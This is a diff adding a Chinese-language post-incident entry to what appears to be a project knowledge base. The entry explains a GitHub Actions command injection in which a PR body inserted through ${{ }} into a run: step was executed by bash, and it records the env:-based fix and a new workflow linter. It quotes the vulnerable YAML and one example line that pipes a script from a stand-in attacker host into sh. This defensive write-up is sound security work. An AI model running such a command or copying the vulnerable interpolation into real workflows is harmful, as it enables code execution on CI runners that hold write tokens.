@@ -4,6 +4,80 @@
 
 ---
 
+## K-008 — PR 內文被 CI 當成指令執行：`${{ }}` 內插進 `run:` 就是命令注入
+
+- 日期：2026-08-10 | 來源：`CHG-20260810-04`（發現於 `CHG-20260810-03` 的 PR #210 CI log）
+- 狀態：**已修復**（G2 改走 `env:`；新增 G8 `workflow_lint` 防復發）
+
+### 錯誤
+
+PR #210 的閘門全綠、順利合併。但翻 `gate` job 的 log 時，**G2 步驟**裡有一整排：
+
+```
+line 39: Proposed: command not found
+line 39: scripts/status_check.py: Permission denied
+line 39: session_start.py: command not found
+line 39: tests/e1/test_backend_guard.py: Permission denied
+line 39: 已驗收/已收尾/accepted/closed: No such file or directory
+```
+
+那些全部是**該 PR 內文裡的 markdown 行內程式碼**。G2 只是想檢查內文有沒有 `CHG-`
+字樣，結果把內文當成 shell 腳本執行了一遍。
+
+這次的後果是良性的（沒有可執行權限、指令不存在）。但同一條路徑上，
+`$(curl attacker.example/x.sh | sh)` 會在帶著 `contents: write` +
+`pull-requests: write` 的 GITHUB_TOKEN 的 runner 上執行。
+**任何能在本 repo 開 PR 的人都做得到，不需要任何額外權限。**
+
+### 根因
+
+```yaml
+run: |
+  echo "${{ github.event.pull_request.body }}" | grep -qE 'CHG-[0-9]{8}-'
+```
+
+關鍵在於 **`${{ }}` 不是 shell 變數**。它是 GitHub Actions 在**把腳本交給 shell
+之前**做的字串替換——runner 先把 PR 內文原封不動貼進腳本檔，才啟動 bash。
+於是內文裡的反引號與 `$(...)` 對 bash 而言就是命令替換語法，不是資料。
+
+雙引號救不了：`"..."` 內部的反引號與 `$()` 照樣求值。**引號只擋斷字，不擋求值。**
+
+這個寫法從 G2 上線起就存在，一直沒被發現，是因為**在此之前沒有人在 PR 內文裡
+寫過反引號**。缺陷不是被測出來的，是被一份剛好含 markdown 行內程式碼的內文撞出來的。
+
+### 解法
+
+**透過 `env:` 傳值**——shell 自己去讀環境變數，值永遠是資料：
+
+```yaml
+env:
+  PR_BODY: ${{ github.event.pull_request.body }}
+run: |
+  printf '%s' "$PR_BODY" | grep -qE 'CHG-[0-9]{8}-'
+```
+
+（`printf '%s'` 而非 `echo`：`echo` 對含 `-n`／`-e` 開頭的內容行為依實作而異。）
+
+同時修掉同類的三處 `origin/${{ github.base_ref }}`——**git 允許分支名含 `$`、
+`(`、`)` 與反引號**，ref 名內插進 `run:` 是同一個注入面，只是利用門檻較高。
+
+**防復發：G8 `scripts/workflow_lint.py`**（`CHG-20260810-04`）。判定採**允許清單**
+而非黑名單：`run:` 裡出現的 `${{ }}` 一律違規，除非在清單上（整數、SHA、repo 全名、
+`steps.*.outputs.*`）。黑名單擋不完——今天擋 `body`，明天有人用 `title`、`head_ref`、
+issue comment。需要例外時加 `# workflow-lint: allow <理由>`，**理由不可空白，
+且必須貼在違規行本身或其上一行**（貼在步驟開頭會替日後新增的行一起背書）。
+
+### 教訓
+
+1. **`${{ }}` 在 `run:` 裡永遠當成「貼字串進腳本」來讀，不要當成變數。**
+   要判斷安不安全，問的不是「這個值是誰的」，而是「把這段文字貼進 bash 會怎樣」。
+2. **閘門的 log 要看，不是只看紅綠。** 這個缺陷所在的那次執行是**綠燈**——
+   注入的指令全部失敗，但 `grep` 成功了，步驟就過了。只看 exit code 永遠看不到它。
+3. 這條與 [[K-003]] 同型：**守衛自己有洞，而洞不會讓任何測試變紅。**
+   差別在 K-003 是防線空轉，這條是防線本身變成攻擊面。
+
+---
+
 ## K-007 — 契約一接上真實後端，立刻抓到 16 個單元踩在不可能成立的路徑上
 
 - 日期：2026-08-03 | 來源：`CHG-20260803-10`（修 [[K-003]] 的當下發現）
